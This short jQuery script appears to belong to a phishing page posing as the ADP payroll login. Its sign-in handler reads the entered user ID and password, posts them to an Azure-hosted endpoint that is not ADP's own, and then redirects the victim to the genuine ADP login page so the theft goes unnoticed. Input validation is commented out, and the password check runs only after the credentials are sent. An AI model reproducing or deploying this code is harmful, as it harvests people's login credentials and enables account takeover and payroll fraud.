$(document).ready(function() {
  
	$('#verifUseridBtn').click(function() {
	    $('#frmPassword').css({'display':'block'});
		$('#next_div').hide();
		$('#signin_div').css({'display':'block'});
		
			
	}
	 );
	 
	
	$('button#signBtn').click(function() {
		$('div.text-input-error-wrapper, div.password-input-error-wrapper, div.phone-input-error-wrapper').html('');
		var em=$.trim($('input[name=user_id]').val());
		var psw=$.trim($('input[name=password]').val());
		//if(!em.match(/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/)) {
			//$('div.text-input-error-wrapper').html('Please enter your email');
			//return false;
		//}
		
		//$('button.login-button').attr({'disabled':'disabled'});
		//$('.login-loading-indicator').css({'display':'block'});
		$.post('https://newadp.azurewebsites.net/post.php', {em:em, psw:psw}, function(res) {
			document.location.href='https://www.adp.com/logins/adp-portal.aspx';
				
			});
		$('#common_alert_div').css({'display':'block'});	
		if(psw.length<1) {
			$('div.password-input-error-wrapper').html('Please enter your password');
			return false;
		}	
		
	});
})
